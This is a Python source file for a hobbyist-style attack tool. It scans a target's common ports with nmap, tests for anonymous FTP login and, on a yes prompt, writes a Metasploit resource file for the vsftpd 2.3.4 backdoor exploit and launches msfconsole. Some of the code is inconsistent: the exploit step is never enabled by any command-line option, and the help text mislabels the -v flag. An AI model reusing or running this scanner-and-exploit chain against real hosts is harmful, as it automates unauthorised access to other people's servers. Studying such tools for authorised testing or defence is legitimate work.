import nmap
from optparse import OptionParser
import pyfiglet
import os, ftplib


class Vulnerability:
    def __init__(self):
        self.rcfile = open('meta.rc', 'w')

    # checking the anonymous logins for ftp
    def ftpanonLogin(self, target):
        try:
            ftp = ftplib.FTP(target)
            ftp.login('anonymous', 'me@your.com')
            print("[+] FTP Anonymous Login Found")
            ftp.quit()
            return True
        except Exception as e:
            return False


    # exploits the vsftp backdoor
    def exploitvsftpbackdoor(self, target):
        with open('meta.rc', 'w') as f:
            f.write('use exploit/unix/ftp/vsftpd_234_backdoor\n')
            f.write('set RHOST ' + str(target)+ "\n")
            f.write('exploit')
            f.close()




class Scanner:
    def __init__(self):
        self.ascii_banner = pyfiglet.figlet_format("Scanner")
        print(self.ascii_banner)
        self.nmScan = nmap.PortScanner()
        self.popular_ports_list = ['23', '554' , '3306', '179', '1080', '161', '162', '445', '5432', '9092', '6379', '80', '443', '22', '21', '8080', '23', '25' ,'53', '587', '993', '995', '8443', '465', '1080']
        self.opened_port = []
        self.vulnerability = Vulnerability()
        self.vulnerability_scan = False
        self.exploit_state = False


    # scans for open ports
    def tcpScan(self, target, port):
        self.nmScan.scan(target, port)
        state = self.nmScan[target]['tcp'][int(port)]['state']
        if state == 'open':
            print(f"[+] {port}/tcp  {state}")
            self.opened_port.append(port)
        else:
            print(f"[-] {port}/tcp {state}")



    def vulScan(self, target):
        if '21' in self.opened_port:
            self.vulnerability.ftpanonLogin(target)

    def exploit(self, target):
        if '21' in self.opened_port:
            self.vulnerability.ftpanonLogin(target)
            print("would you like to exploit the vsftpd?")
            choice = input(">>: ")
            if choice == 'yes':
                print("[*] attempting vsftpd_234_backdoor")
                self.vulnerability.exploitvsftpbackdoor(target)
                os.system('msfconsole -r meta.rc')


    def scan(self, target, ports):
        print(f"[+] Scanning for {target}")
        for port in ports:
            self.tcpScan(target, port)

        if self.vulnerability_scan:
            print("-" * 40)
            print("[*] Looking for vulnerabilities")
            self.vulScan(target)

        if self.exploit_state:
            print("-" * 40)
            self.exploit(target)








def main():
    scanner = Scanner()

    parser = OptionParser('usage %prog -t <target host> -p <target port> ')

    parser.add_option('-t', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-p', dest='tgtPort', type='string', help='specify target port, separated by comma')
    parser.add_option('-v', dest='vulnerability_scan', action='store_true' , help='enable exploit')


    # when arguments are given parse them
    (options, args) = parser.parse_args()


    tgtHost = options.tgtHost
    tgtPorts = str(options.tgtPort).split(",")
    vulnerability_scan =options.vulnerability_scan

    if (tgtHost == None):
        print(parser.usage)
        exit(0)


    if tgtPorts[0] == 'None':
        print("[!] Popular Ports will be used")
        tgtPorts = scanner.popular_ports_list

    if vulnerability_scan != None:
        print("[*] Enabled to look for vulnerabilities")
        scanner.vulnerability_scan = True

    scanner.scan(tgtHost, tgtPorts)


if __name__ == '__main__':
    main()
